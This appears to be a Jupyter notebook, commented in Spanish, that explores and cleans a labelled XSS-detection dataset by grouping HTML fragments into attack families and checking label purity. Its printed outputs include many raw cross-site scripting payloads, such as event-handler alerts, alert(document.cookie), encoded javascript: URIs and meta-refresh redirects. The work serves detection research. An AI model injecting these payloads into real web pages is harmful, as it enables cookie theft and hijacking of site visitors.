# img_tag|text_container_tag                                                    5
# script_tag|marquee_tag|img_tag|header_tag                                     4
# script_tag|img_tag|header_tag|text_container_tag                              4
# event_onload|event_onerror                                                    4
# script_tag|marquee_tag|img_tag|header_tag|text_container_tag                  4
# script_tag|img_tag|event_onerror                                              4
# body_tag|header_tag|event_onload                                              4
# text_container_tag|event_onmouseover|event_onclick                            4
# script_tag|iframe_tag|body_tag                                                4
# marquee_tag|img_tag|event_onerror                                             3
# script_tag|event_onreadystatechange                                           3
# marquee_tag|header_tag|text_container_tag                                     3
# iframe_tag|body_tag                                                           3
# script_tag|marquee_tag|body_tag|header_tag|event_onload                       3
# script_tag|plain_tag                                                          3
# script_tag|event_onerror                                                      3
# iframe_tag|img_tag|event_onerror                                              3
# script_tag|img_tag|text_container_tag                                         3
# iframe_tag|event_onmouseover                                                  3
# event_onreadystatechange                                                      3
# marquee_tag|header_tag|plain_tag|text_container_tag                           3
# header_tag|event_onmouseover                                                  3
# img_tag|body_tag|event_onload                                                 3
# body_tag|text_container_tag|event_onload                                      2
# text_container_tag|event_onload                                               2
# event_onunload                                                                2
# marquee_tag|img_tag                                                           2
# script_tag|iframe_tag|body_tag|event_onload                                   2
# iframe_tag|text_container_tag                                                 2
# script_tag|text_container_tag|event_onclick                                   2
# marquee_tag|iframe_tag                                                        2
# script_tag|img_tag|event_onload                                               2
# header_tag|text_container_tag                                                 2
# script_tag|iframe_tag|header_tag                                              2
# script_tag|body_tag|plain_tag                                                 2
# script_tag|marquee_tag|iframe_tag|header_tag                                  2
# iframe_tag|img_tag|text_container_tag                                         2
# script_tag|iframe_tag|img_tag|body_tag                                        2
# iframe_tag|body_tag|event_onload                                              2
# iframe_tag|img_tag                                                            2
# script_tag|body_tag|plain_tag|text_container_tag|event_onload                 1
# script_tag|body_tag|header_tag|event_onload                                   1
# script_tag|img_tag|header_tag                                                 1
# script_tag|text_container_tag|event_onmouseover                               1
# script_tag|iframe_tag|text_container_tag|event_onload                         1
# img_tag|text_container_tag|event_onerror                                      1
# iframe_tag|event_onerror                                                      1
# plain_tag|text_container_tag|event_onmouseover                                1
# img_tag|body_tag|text_container_tag|event_onerror                             1
# event_onerror|event_onreadystatechange                                        1
# img_tag|text_container_tag|event_onload                                       1
# body_tag|header_tag|text_container_tag                                        1
# event_onload|event_onreadystatechange                                         1
# img_tag|text_container_tag|event_onmouseover                                  1
# ...
#
#        Label                                      families_str  \
# 10943      1                                        script_tag
# 10967      1                                        script_tag
# 10969      1                                        script_tag
# 10991      1                             script_tag|header_tag
# 11022      1                                        script_tag
# 11049      1                                        script_tag
# 11050      1                             script_tag|header_tag
# 11081      1                                        script_tag
# 11103      1                                        script_tag
# 11155      1                                        iframe_tag
# 11309      1                                        script_tag
# 11330      0                                             other
# 11343      0                                             other
# 11454      1                                        script_tag
# 11481      1                                        script_tag
# 11492      1                             script_tag|iframe_tag
# 11494      1                                        script_tag
# 11534      1                 script_tag|marquee_tag|header_tag
# 11590      1                            marquee_tag|header_tag
# 11600      1           script_tag|plain_tag|text_container_tag
# 11601      1           script_tag|plain_tag|text_container_tag
# 11602      1           script_tag|plain_tag|text_container_tag
# 11609      1                     script_tag|text_container_tag
# 11625      1                                        script_tag
# 11641      1                                        script_tag
# 11665      1                                        script_tag
# 11689      1                                        script_tag
# 11690      1                                        script_tag
# 11692      1                                        script_tag
# 11743      1                                        script_tag
# 11770      1                                        script_tag
# 11780      1                                        script_tag
# 11795      1                                        script_tag
# 11876      1                                        script_tag
# 11877      1                                        script_tag
# 11902      1                                        script_tag
# 11916      1                                        script_tag
# 11962      1                                        script_tag
# 11998      1                                        script_tag
# 12019      1                             script_tag|header_tag
# 12055      1                                        script_tag
# 12085      1                                        script_tag
# 12139      1                                        script_tag
# 12144      1                                        script_tag
# 12170      1                                        script_tag
# 12181      1                                        script_tag
# 12189      1                                        script_tag
# 12191      1                                        script_tag
# 12199      1                                        script_tag
# 12203      1                                        script_tag
# 12214      1                                        script_tag
# 12285      1                                        script_tag
# 12287      1                                        script_tag
# 12318      1                 script_tag|marquee_tag|header_tag
# 12345      1                 script_tag|marquee_tag|header_tag
# 12420      1                 script_tag|marquee_tag|header_tag
# 12422      1                 script_tag|marquee_tag|header_tag
# 12471      1                                        script_tag
# 12492      1                                        script_tag
# 12510      1                                        script_tag
# 12518      1                                        header_tag
# 12521      1                                        script_tag
# 12523      1                                        script_tag
# 12524      1                                        script_tag
# 12527      1                                        script_tag
# 12557      1                             script_tag|header_tag
# 12558      1                             script_tag|header_tag
# 12559      1                             script_tag|header_tag
# 12573      1                     script_tag|body_tag|plain_tag
# 12591      1                     script_tag|text_container_tag
# 12606      1                                        script_tag
# 12625      1                                        iframe_tag
# 12629      1                                        script_tag
# 12641      1                            marquee_tag|header_tag
# 12741      1                                        script_tag
# 12790      1                                        script_tag
# 12885      1                                        script_tag
# 12890      1                                        script_tag
# 12892      1                                        script_tag
# 12944      0                                             other
# 13009      1                                        iframe_tag
# 13078      1                                        script_tag
# 13080      1                                        script_tag
# 13139      1  script_tag|img_tag|header_tag|text_container_tag
# 13177      1                                        script_tag
# 13276      1                                        script_tag
# 13374      1                                        script_tag
# 13381      1                                        script_tag
# 13491      1                                        script_tag
# 13509      1                                        script_tag
# 13510      1                                        script_tag
# 13628      1                                        script_tag
# 13656      1                 script_tag|marquee_tag|header_tag
# 13662      1                 script_tag|marquee_tag|header_tag
# 13664      1                 script_tag|marquee_tag|header_tag
# 13673      1                                        script_tag
# 13848      1                    marquee_tag|text_container_tag
# 13860      1                                        script_tag
# 13873      1                             iframe_tag|header_tag
# 13917      1                                        script_tag
# 13967      1                                        script_tag
# 14059      1                                        script_tag
# 14060      1                                        script_tag
# 14082      1                                        script_tag
# 14109      1                                        script_tag
# 14118      1                                        script_tag
# 14127      1                                text_container_tag
# 14175      1                            marquee_tag|header_tag
# 14199      0                                             other
# 14222      1                                        script_tag
# 14228      1                                        script_tag
# 14240      1                                        script_tag
# 14479      1                                        script_tag
# 14730      1                                        script_tag
# 14737      1                                        script_tag
# 14739      1                                        script_tag
# 14811      1                                        script_tag
# 14867      1                                          body_tag
# 14872      1                                          body_tag
# 14874      1                                          body_tag
# 14883      1                                          body_tag
# 14887      1                                       marquee_tag
# 14891      1                                          body_tag
# 14893      1                                       marquee_tag
# 14900      1                                          body_tag
# 14902      1                                          body_tag
# 14904      1                                          body_tag
# 14906      1                                          body_tag
# 14907      1                                        iframe_tag
# 14909      1                                          body_tag
# 14961      0                                             other
# 14963      1                                          body_tag
# 14964      0                                             other
# 14968      1                                          body_tag
# 14969      0                                             other
# 14986      1                                text_container_tag
# 14999      0                                             other
# 15017      0                                             other
# 15042      0                                             other
# 15043      0                                             other
# 15059      1                                          body_tag
# 15060      1                                text_container_tag
# 15095      0                                             other
# 15096      0                                             other
# 15109      0                                             other
# 15121      1                                       marquee_tag
# 15160      0                                             other
# 15162      1                                          body_tag
# 15177      0                                             other
# 15231      1                                text_container_tag
# 15256      1            script_tag|body_tag|text_container_tag
#
#        len_after_clean  source
# 10943              107  github
# 10967              271  github
# 10969              179  github
# 10991              144  github
# 11022              118  github
# 11049              117  github
# 11050              137  github
# 11081              241  github
# 11103               99  github
# 11155               40  github
# 11309              148  github
# 11330               68  github
# 11343               79  github
# 11454              137  github
# 11481              916  github
# 11492              253  github
# 11494              174  github
# 11534              185  github
# 11590              172  github
# 11600              492  github
# 11601              755  github
# 11602              682  github
# 11609              644  github
# 11625              107  github
# 11641               45  github
# 11665               64  github
# 11689              152  github
# 11690              167  github
# 11692              224  github
# 11743              103  github
# 11770               85  github
# 11780              191  github
# 11795              201  github
# 11876               44  github
# 11877               44  github
# 11902              336  github
# 11916               70  github
# 11962               63  github
# 11998              218  github
# 12019               49  github
# 12055               90  github
# 12085               99  github
# 12139               68  github
# 12144               68  github
# 12170               62  github
# 12181               83  github
# 12189              281  github
# 12191               44  github
# 12199               49  github
# 12203              403  github
# 12214               79  github
# 12285              179  github
# 12287               63  github
# 12318              218  github
# 12345              506  github
# 12420              256  github
# 12422              146  github
# 12471               76  github
# 12492               59  github
# 12510              844  github
# 12518               85  github
# 12521               92  github
# 12523              176  github
# 12524              113  github
# 12527              190  github
# 12557              223  github
# 12558              214  github
# 12559              214  github
# 12573               97  github
# 12591              615  github
# 12606              265  github
# 12625              154  github
# 12629               56  github
# 12641              136  github
# 12741              114  github
# 12790              298  github
# 12885              167  github
# 12890               77  github
# 12892             1227  github
# 12944               87  github
# 13009               43  github
# 13078               86  github
# 13080               59  github
# 13139              184  github
# 13177               93  github
# 13276              930  github
# 13374              168  github
# 13381               50  github
# 13491               84  github
# 13509              821  github
# 13510              344  github
# 13628               92  github
# 13656              122  github
# 13662              124  github
# 13664              403  github
# 13673              124  github
# 13848              416  github
# 13860              279  github
# 13873               86  github
# 13917               58  github
# 13967              108  github
# 14059              110  github
# 14060              111  github
# 14082              124  github
# 14109               98  github
# 14118               44  github
# 14127               49  github
# 14175              135  github
# 14199              148  github
# 14222              141  github
# 14228              500  github
# 14240              199  github
# 14479               47  github
# 14730               37  github
# 14737              878  github
# 14739              185  github
# 14811              347  github
# 14867               90  github
# 14872              102  github
# 14874               84  github
# 14883               84  github
# 14887               84  github
# 14891               96  github
# 14893               87  github
# 14900               78  github
# 14902               84  github
# 14904               89  github
# 14906               81  github
# 14907              110  github
# 14909               72  github
# 14961               61  github
# 14963               67  github
# 14964              112  github
# 14968               51  github
# 14969              186  github
# 14986               69  github
# 14999               66  github
# 15017               71  github
# 15042               75  github
# 15043               88  github
# 15059               52  github
# 15060               78  github
# 15095               68  github
# 15096               81  github
# 15109               65  github
# 15121               53  github
# 15160              135  github
# 15162              115  github
# 15177               76  github
# 15231             2273  github
# 15256             1108  github
# === Posibles duplicados por longitud + familia (todas las combinaciones ordenadas por frecuencia) ===
# len_after_clean  families_str
# 44               event_handler                              228
# 46               event_handler                              213
# 42               event_handler                              208
# 92               other                                      201
# 48               event_handler                              198
#                                                            ...
# 110              script_tag|event_handler                     1
#                  iframe_tag                                   1
#                  event_handler|iframe_tag|maybe_polyglot      1
# 109              script_tag|img_tag|event_onerror             1
# 2854             script_tag                                   1
# Length: 2797, dtype: int64

# %%
# ================================
# Colapsar families_str a 5 clases
# ================================

import pandas as pd

print("Shape actual del df:", df.shape)
print("Columnas:", df.columns.tolist())

# 1) Función de mapeo a familia colapsada
def map_family_main(fam: str) -> str:
    """
    Colapsa families_str en 5 categorías:
      - 'script' : si aparece 'script_tag'
      - 'event'  : si aparece 'event_' (onload, onmouseover, etc.)
      - 'js_uri' : si aparece 'javascript_uri'
      - 'iframe' : si aparece 'iframe_tag'
      - 'benign' : en cualquier otro caso
    El orden de prioridad es:
      script > event > js_uri > iframe > benign
    """
    if pd.isna(fam):
        return "benign"
    s = str(fam)

    # Prioridad 1: script_tag
    if "script_tag" in s:
        return "script"

    # Prioridad 2: cualquier event_*
    if "event_" in s:
        return "event"

    # Prioridad 3: javascript_uri
    if "javascript_uri" in s:
        return "js_uri"

    # Prioridad 4: iframe_tag
    if "iframe_tag" in s:
        return "iframe"

    # Todo lo demás: benign
    return "benign"


# 2) Crear columna family_main
df["family_main"] = df["families_str"].apply(map_family_main)

# 3) (Opcional pero útil) flags binarios por tipo
df["has_script_tag"] = df["families_str"].str.contains("script_tag", na=False)
df["has_event"]      = df["families_str"].str.contains("event_", na=False)
df["has_js_uri"]     = df["families_str"].str.contains("javascript_uri", na=False)
df["has_iframe"]     = df["families_str"].str.contains("iframe_tag", na=False)

# 4) Resumen rápido para verificar
print("\n=== Distribución family_main ===")
print(df["family_main"].value_counts())

print("\n=== family_main vs Label ===")
display(pd.crosstab(df["family_main"], df["Label"], normalize="index").round(3))

print("\n=== Preview con nueva columna ===")
display(df[["Sentence_clean", "Label", "families_str", "family_main", "len_after_clean", "source"]].head(15))
# Out:
# Shape actual del df: (15351, 5)
# Columnas: ['Sentence_clean', 'Label', 'families_str', 'len_after_clean', 'source']
#
# === Distribución family_main ===
# event     7667
# benign    4030
# script    3408
# iframe     210
# js_uri      36
# Name: family_main, dtype: int64
#
# === family_main vs Label ===
# Label            0      1
# family_main
# benign       0.900  0.100
# event        0.001  0.999
# iframe       0.000  1.000
# js_uri       0.000  1.000
# script       0.004  0.996
# === Preview con nueva columna ===
#                                                                                                                                                                                              Sentence_clean  \
# 0   <li><a href="/wiki/File:Socrates.png" class="image"><img alt="Socrates.png" src="//upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Socrates.png/18px-Socrates.png" decoding="async" width="18" hei...
# 1                                                                                                                                                                      <tt onmouseover="alert(1)">test</tt>
# 2   </span> <span class="reference-text">Steering for the 1995 "<a href="/wiki/History_of_autonomous_cars#1990s" class="mw-redirect" title="History of autonomous cars">No Hands Across America </a>" re...
# 3   </span> <span class="reference-text"><cite class="citation web"><a rel="nofollow" class="external text" href="https://www.mileseducation.com/finance/artificial_intelligence">"Miles Education | Fut...
# 4   </span>. <a href="/wiki/Digital_object_identifier" title="Digital object identifier">doi </a>:<a rel="nofollow" class="external text" href="https://doi.org/10.1016%2FS0921-8890%2805%2980025-9">10....
# 5                                                                                                              <li id="cite_note-118"><span class="mw-cite-backlink"><b><a href="#cite_ref-118">^ </a> </b>
# 6                                                                                                                          <li><a href="/wiki/Contextualism" title="Contextualism">Contextualism </a> </li>
# 7   <li id="cite_note-Representing_causation-95"><span class="mw-cite-backlink">^ <a href="#cite_ref-Representing_causation_95-0"><sup><i><b>a </b> </i> </sup> </a> <a href="#cite_ref-Representing_cau...
# 8                                                                                                                                                  <tr><td class="plainlist" style="padding:0 0.1em 0.4em">
# 9                                                                                                                                                                                                   </span>
# 10                                                                                                           <li><a href="/wiki/Mind%E2%80%93body_problem" title="Mind–body problem">Mind–body problem </a>
# 11                                                                                                                                                 <a onblur=alert(1) tabindex=1 id=x></a><input autofocus>
# 12                                                                                                                                                  <col draggable="true" ondragenter="alert(1)">test</col>
# 13                                                                                                                                                            <caption onpointerdown=alert(1)>XSS</caption>
# 14                                                                                                         </span><link rel="mw-deduplicated-inline-style" href="mw-data:TemplateStyles:r935243608"/> </li>
#
#     Label    families_str family_main  len_after_clean  source
# 0       0       image_tag      benign              557  kaggle
# 1       1   event_handler       event               36  kaggle
# 2       0           other      benign              230  kaggle
# 3       0  maybe_polyglot      benign              392  kaggle
# 4       0           other      benign              419  kaggle
# 5       0           other      benign               92  kaggle
# 6       0           other      benign               80  kaggle
# 7       0           other      benign              243  kaggle
# 8       0           other      benign               56  kaggle
# 9       0           other      benign                7  kaggle
# 10      0           other      benign               94  kaggle
# 11      1   event_handler       event               56  kaggle
# 12      1   event_handler       event               55  kaggle
# 13      1   event_handler       event               45  kaggle
# 14      0           other      benign               96  kaggle

# %%
# ============================================
# ANÁLISIS PROFUNDO – PARTE 2
# ============================================

import pandas as pd
import numpy as np

print("Shape:", df.shape)

# --------------------------------------------------
# 1. Pureza dentro de cada family_main
# --------------------------------------------------
print("\n=== Pureza por family_main (Label=1 ratio) ===")
purity_main = df.groupby("family_main")["Label"].mean().sort_values(ascending=False)
print(purity_main)

print("\n=== Conteo por family_main ===")
print(df["family_main"].value_counts())

print("\n=== Tabla family_main vs Label (conteos) ===")
print(pd.crosstab(df["family_main"], df["Label"]))

print("\n=== Tabla family_main vs Label (porcentaje por fila) ===")
print(pd.crosstab(df["family_main"], df["Label"], normalize='index').round(3))

# --------------------------------------------------
# 2. Longitud (len_after_clean) por family_main
# --------------------------------------------------
print("\n=== Estadísticas de longitud por family_main ===")
len_stats_main = df.groupby("family_main")["len_after_clean"].describe()
print(len_stats_main)

# --------------------------------------------------
# 3. Outliers dentro de BENIGN (posibles ataques ocultos)
# --------------------------------------------------

# Un benigno muy sospechoso podría ser:
# - Largo (>400 chars)
# - Contener cosas tipo <script pero no marcado
# - Contener onXXX pero no marcado
mask_benign_susp_long = (df["family_main"]=="benign") & (df["len_after_clean"]>400)

mask_benign_susp_script = (df["family_main"]=="benign") & df["Sentence_clean"].str.contains("<script", case=False, na=False)

mask_benign_susp_event = (df["family_main"]=="benign") & df["Sentence_clean"].str.contains("on[a-z]+\s*=", regex=True, na=False)

print("\n=== Benign sospechosos por longitud (>400) ===")
display(df[mask_benign_susp_long].head(20))
print("Total:", df[mask_benign_susp_long].shape[0])

print("\n=== Benign sospechosos que contienen <script ===")
display(df[mask_benign_susp_script].head(20))
print("Total:", df[mask_benign_susp_script].shape[0])

print("\n=== Benign sospechosos que contienen onXXX ===")
display(df[mask_benign_susp_event].head(20))
print("Total:", df[mask_benign_susp_event].shape[0])

# --------------------------------------------------
# 4. Inconsistencias fuertes Label=1 pero family_main=benign
# --------------------------------------------------
print("\n=== Ataques (Label=1) clasificados como benign ===")
mask_attack_benign = (df["Label"]==1) & (df["family_main"]=="benign")
display(df[mask_attack_benign].head(30))
print("Total:", df[mask_attack_benign].shape[0])

# --------------------------------------------------
# 5. Inconsistencias fuertes Label=0 pero family_main no benign
# --------------------------------------------------
print("\n=== Benignos (Label=0) clasificados como script/event/iframe/js_uri ===")
mask_benign_nonbenign = (df["Label"]==0) & (df["family_main"]!="benign")
display(df[mask_benign_nonbenign].head(30))
print("Total:", df[mask_benign_nonbenign].shape[0])
# Out:
# Shape: (15351, 10)
#
# === Pureza por family_main (Label=1 ratio) ===
# family_main
# iframe    1.000000
# js_uri    1.000000
# event     0.998957
# script    0.995892
# benign    0.100248
# Name: Label, dtype: float64
#
# === Conteo por family_main ===
# event     7667
# benign    4030
# script    3408
# iframe     210
# js_uri      36
# Name: family_main, dtype: int64
#
# === Tabla family_main vs Label (conteos) ===
# Label           0     1
# family_main
# benign       3626   404
# event           8  7659
# iframe          0   210
# js_uri          0    36
# script         14  3394
#
# === Tabla family_main vs Label (porcentaje por fila) ===
# Label            0      1
# family_main
# benign       0.900  0.100
# event        0.001  0.999
# iframe       0.000  1.000
# js_uri       0.000  1.000
# script       0.004  0.996
#
# === Estadísticas de longitud por family_main ===
#               count        mean         std   min    25%    50%    75%     max
# family_main
# benign       4030.0  228.184615  320.667657   5.0  74.00  100.0  219.0  2587.0
# event        7667.0   69.412156  100.172123  13.0  43.00   53.0   69.0  2686.0
# iframe        210.0   73.971429  128.929079  12.0  36.00   48.0   72.0  1766.0
# js_uri         36.0   41.916667   21.390752  15.0  28.25   35.0   49.0   120.0
# script       3408.0   97.077758  149.165974   9.0  43.00   62.0   95.0  2854.0
#
# === Benign sospechosos por longitud (>400) ===
#                                                                                                                                                                                               Sentence_clean  \
# 0    <li><a href="/wiki/File:Socrates.png" class="image"><img alt="Socrates.png" src="//upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Socrates.png/18px-Socrates.png" decoding="async" width="18" hei...
# 4    </span>. <a href="/wiki/Digital_object_identifier" title="Digital object identifier">doi </a>:<a rel="nofollow" class="external text" href="https://doi.org/10.1016%2FS0921-8890%2805%2980025-9">10....
# 27   </span> <span class="reference-text"><cite class="citation journal"><a href="/wiki/Woody_Evans" title="Woody Evans">Evans, Woody </a> (2015). "Posthuman Rights: Dimensions of Transhuman Worlds". <...
# 37   </span>. <i>Behavioral and Brain Sciences </i>. <b>3 </b> (3): 417–457. <a href="/wiki/Digital_object_identifier" title="Digital object identifier">doi </a>:<a rel="nofollow" class="external text"...
# 39   </span> <span class="reference-text"><cite class="citation journal">Prakken, Henry (31 August 2017). "On the problem of making autonomous vehicles conform to traffic law". <i>Artificial Intelligen...
# 77   </span> <span class="reference-text">Celli, Fabio, Pietro Zani Massani, and Bruno Lepri. "Profilio: Psychometric Profiling to Boost Social Media Advertising." Proceedings of the 2017 ACM on Multim...
# 102  </span>. </cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=ZDNet&amp;rft.atitle=Half+of+Americans+do+not+believe+d...
# 104  <li><cite id="CITEREFTuring1950" class="citation"><a href="/wiki/Alan_Turing" title="Alan Turing">Turing, Alan </a> (October 1950), "Computing Machinery and Intelligence", <i><a href="/wiki/Mind_(...
# 130  </li><li style="min-height: 31px;"><span style="display: inline-block; width: 31px; line-height: 31px; vertical-align: middle; text-align: center;"><img alt="" src="//upload.wikimedia.org/wikipedi...
# 159  <li><cite id="CITEREFLenatGuha1989" class="citation book"><a href="/wiki/Douglas_Lenat" title="Douglas Lenat">Lenat, Douglas </a>; Guha, R. V. (1989). <i>Building Large Knowledge-Based Systems </i...
# 161  <ul><li><cite class="citation book"><a href="/wiki/David_Berlinski" title="David Berlinski">Berlinski, David </a> (2000). <a rel="nofollow" class="external text" href="https://archive.org/details/...
# 202  <li><a href="/wiki/Christof_Koch" title="Christof Koch">Koch, Christof </a>, "Proust among the Machines", <i><a href="/wiki/Scientific_American" title="Scientific American">Scientific American </a...
# 206  </span> <span class="reference-text"><cite class="citation news"><a rel="nofollow" class="external text" href="https://www.bbc.com/news/technology-35785875">"Artificial intelligence: Google's Alph...
# 217  </span> <span class="reference-text"><cite class="citation journal">Samuel, A. L. (July 1959). "Some Studies in Machine Learning Using the Game of Checkers". <i>IBM Journal of Research and Develop...
# 225  </span>. </cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Wired+UK&amp;rft.atitle=The+UK+is+about+to+Start+Testin...
# 234  <dd>The brain can be simulated by machines and because brains are intelligent, simulated brains must also be intelligent; thus machines can be intelligent. <a href="/wiki/Hans_Moravec" title="Hans...
# 252  </span> <span class="reference-text"><cite class="citation journal">Smoliar, Stephen W.; Zhang, HongJiang (1994). "Content based video indexing and retrieval". <i>IEEE Multimedia </i>. <b>1 </b> (...
# 307  <img alt="" src="//upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Kismet_robot_at_MIT_Museum.jpg/220px-Kismet_robot_at_MIT_Museum.jpg" decoding="async" width="220" height="165" class="thumbimag...
# 311  <ul><li><img alt="Category" src="//upload.wikimedia.org/wikipedia/en/thumb/4/48/Folder_Hexagonal_Icon.svg/16px-Folder_Hexagonal_Icon.svg.png" decoding="async" title="Category" width="16" height="1...
# 376  </span>. <a href="/wiki/Digital_object_identifier" title="Digital object identifier">doi </a>:<a rel="nofollow" class="external text" href="https://doi.org/10.1016%2Fj.artint.2010.09.006">10.1016/...
#
#      Label    families_str  len_after_clean  source family_main  \
# 0        0       image_tag              557  kaggle      benign
# 4        0           other              419  kaggle      benign
# 27       0  maybe_polyglot              903  kaggle      benign
# 37       0           other              806  kaggle      benign
# 39       0  maybe_polyglot              952  kaggle      benign
# 77       0           other              401  kaggle      benign
# 102      0  maybe_polyglot              486  kaggle      benign
# 104      0  maybe_polyglot             1160  kaggle      benign
# 130      0       image_tag              599  kaggle      benign
# 159      0  maybe_polyglot              853  kaggle      benign
# 161      0  maybe_polyglot             1139  kaggle      benign
# 202      0  maybe_polyglot             2002  kaggle      benign
# 206      0           other              527  kaggle      benign
# 217      0  maybe_polyglot              476  kaggle      benign
# 225      0  maybe_polyglot              473  kaggle      benign
# 234      0  maybe_polyglot              618  kaggle      benign
# 252      0  maybe_polyglot              882  kaggle      benign
# 307      0       image_tag              511  kaggle      benign
# 311      0       image_tag              592  kaggle      benign
# 376      0           other              841  kaggle      benign
#
#      has_script_tag  has_event  has_js_uri  has_iframe
# 0             False      False       False       False
# 4             False      False       False       False
# 27            False      False       False       False
# 37            False      False       False       False
# 39            False      False       False       False
# 77            False      False       False       False
# 102           False      False       False       False
# 104           False      False       False       False
# 130           False      False       False       False
# 159           False      False       False       False
# 161           False      False       False       False
# 202           False      False       False       False
# 206           False      False       False       False
# 217           False      False       False       False
# 225           False      False       False       False
# 234           False      False       False       False
# 252           False      False       False       False
# 307           False      False       False       False
# 311           False      False       False       False
# 376           False      False       False       False
# Total: 665
#
# === Benign sospechosos que contienen <script ===
# Empty DataFrame
# Columns: [Sentence_clean, Label, families_str, len_after_clean, source, family_main, has_script_tag, has_event, has_js_uri, has_iframe]
# Index: []
# Total: 0
#
# === Benign sospechosos que contienen onXXX ===
#                                                                                                                                                                                                 Sentence_clean  \
# 11330                                                                                                                                     <metahttp-equiv="refresh" content="0;url=http://www.google.com/"> ""
# 11343                                                                                                                          <metahttp-equiv="refresh" content="0;url=http://www.cyber-warrior.org/israil/">
# 11590                             <marquee><h1><strong><i>cueballr<+i><+strong><+h1><+marquee>&_keyword='">><marquee><h1><strong><i>cueballr<+i><+strong><+h1><+marquee>&_choix=ps&_country=&_zone=ww&_region=
# 12518                                                                                                                    <h1>by st@rext<meta http-equiv="refresh" content="1;url=http://lht.by.ru/uyar1.html">
# 12641                                                                 <marquee><h1>this_site_is_not_mcafee_secure</h1></marquee>&searchstring=test&product=&document=&cmd=search&productfamily=&contexttype=gs
# 12944                                                                                                                  <link href=http://starext.by.ru/css.css type=text/css rel=stylesheet>&reponse=nontrouve
# 13848  <font+size="20"+color="green">�estamos-frente-a-un-problema-de-seguridad-grave</font><marquee>seguridad-help-me :p+</marquee><br><font+<br><font+size="20"+color="green">seguridad-help-"+</font><ma...
# 14127                                                                                                                                                        <font+size=72>xss<font>+&zona=resultados-busqueda
# 14175                                                                  <h1>rubberduck</h1><br><br><marquee>whitehat forever</marquee>&sezona='"><h1>rubberduck</h1><br><br><marquee>whitehat forever</marquee>
# 14199                                                     <metahttp-equiv="refresh" content="0;url=http://www.google.com/">""&forgot_email=&forgot_password=&form_submit=forgot_code&mod_id=6&verify_password=
# 14867                                                                                                               <body onmouseenter body onmouseenter="javascript:javascript:alert(1)"></body onmouseenter>
# 14872                                                                                                   <body onpropertychange body onpropertychange="javascript:javascript:alert(1)"></body onpropertychange>
# 14874                                                                                                                     <body onpagehide body onpagehide="javascript:javascript:alert(1)"></body onpagehide>
# 14883                                                                                                                     <body onpageshow body onpageshow="javascript:javascript:alert(1)"></body onpageshow>
# 14887                                                                                                                     <marquee onstart marquee onstart="javascript:javascript:alert(1)"></marquee onstart>
# 14891                                                                                                         <body onbeforeunload body onbeforeunload="javascript:javascript:alert(1)"></body onbeforeunload>
# 14893                                                                                                                  <marquee onscroll marquee onscroll="javascript:javascript:alert(1)"></marquee onscroll>
# 14900                                                                                                                           <body onresize body onresize="javascript:javascript:alert(1)"></body onresize>
# 14902                                                                                                                     <body onpopstate body onpopstate="javascript:javascript:alert(1)"></body onpopstate>
# 14904                                                                                                                <body onkeyup body onkeyup="javascript:javascript:alert(document.cookie)"></body onkeyup>
#
#        Label                    families_str  len_after_clean  source  \
# 11330      0                           other               68  github
# 11343      0                           other               79  github
# 11590      1          marquee_tag|header_tag              172  github
# 12518      1                      header_tag               85  github
# 12641      1          marquee_tag|header_tag              136  github
# 12944      0                           other               87  github
# 13848      1  marquee_tag|text_container_tag              416  github
# 14127      1              text_container_tag               49  github
# 14175      1          marquee_tag|header_tag              135  github
# 14199      0                           other              148  github
# 14867      1                        body_tag               90  github
# 14872      1                        body_tag              102  github
# 14874      1                        body_tag               84  github
# 14883      1                        body_tag               84  github
# 14887      1                     marquee_tag               84  github
# 14891      1                        body_tag               96  github
# 14893      1                     marquee_tag               87  github
# 14900      1                        body_tag               78  github
# 14902      1                        body_tag               84  github
# 14904      1                        body_tag               89  github
#
#       family_main  has_script_tag  has_event  has_js_uri  has_iframe
# 11330      benign           False      False       False       False
# 11343      benign           False      False       False       False
# 11590      benign           False      False       False       False
# 12518      benign           False      False       False       False
# 12641      benign           False      False       False       False
# 12944      benign           False      False       False       False
# 13848      benign           False      False       False       False
# 14127      benign           False      False       False       False
# 14175      benign           False      False       False       False
# 14199      benign           False      False       False       False
# 14867      benign           False      False       False       False
# 14872      benign           False      False       False       False
# 14874      benign           False      False       False       False
# 14883      benign           False      False       False       False
# 14887      benign           False      False       False       False
# 14891      benign           False      False       False       False
# 14893      benign           False      False       False       False
# 14900      benign           False      False       False       False
# 14902      benign           False      False       False       False
# 14904      benign           False      False       False       False
# Total: 42
#
# === Ataques (Label=1) clasificados como benign ===
#                                                                                                                                                                                                Sentence_clean  \
# 71                                                                                                                                                                  <A HREF="http://ha.ckers.org@google"></A>
# 178                                                                                                                                                                                            document.write
# 257                                                                                                                                                 SRC="http://ha.ckers.org/.swf" AllowScriptAccess="always"
# 268                                                                                                                                                                                       d="alert('');\\")";
# 300                                                                                                                                                                      header('Location: '.$_GET['param']);
# 399                                                                                                                                                                                           [1].find(alert)
# 424                                                                                                                                                                            <Input value = "" type = text>
# 516                                                                                               <a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe
# 519                                                                                                                                                                                      document.documentURI
# 520                                                                                                                                                         Set.constructor`alert\\x28document.domain\\x29```
# 580                                                                                                                                                                                              document.URL
# 588                                                                                                                                                                        document.querySelector(".example")
# 1203                                                                                                                                                               document.getElementsByClassName("").length
# 1214                                                                                                                                                                      STYLE="width: expression(alert(''))
# 1312  <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#00000...
# 1357                                                                                                                                                                                                    &#x3C
# 1754                                                                                                                                                                                             b="URL(\\"";
# 2068                                                                                                                                          <STYLE>BODY{-moz-binding:url("http://.rocks/moz.xml#")}</STYLE>
# 2141                                                                                                                                                                         tt p://6 6.000146.0x7.147/"></A>
# 2199                                                                                                                                                                                            eval(a+b+c+d)
# 2226                                                                                                                                                                         <A HREF="//www.google.com/"></A>
# 2407                                                                                                                                                                   DATASRC=#I DATAFLD=C DATAFORMATAS=HTML
# 2453                                                                                                                                                                                             writetitle()
